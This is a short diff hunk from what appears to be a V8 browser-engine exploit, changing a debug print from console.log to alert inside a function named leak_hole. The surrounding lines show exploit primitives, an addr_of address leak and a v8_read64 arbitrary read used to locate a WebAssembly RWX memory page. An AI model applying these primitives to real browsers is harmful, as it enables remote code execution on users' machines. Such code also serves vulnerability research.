@@ -388,7 +388,7 @@ function leak_hole() {
   
       let instance_addr = addr_of(wasmInstance);
       // %DebugPrint(buf1);
-      console.log("[+]wasm instance addr : " + hex(instance_addr));
+      alert("[+]wasm instance addr : " + hex(instance_addr));
       let rwx_addr = v8_read64(instance_addr-1n+0x60n);
       alert("[+]rwx addr : " + hex(rwx_addr));
       let buf_addr = addr_of(buf1);
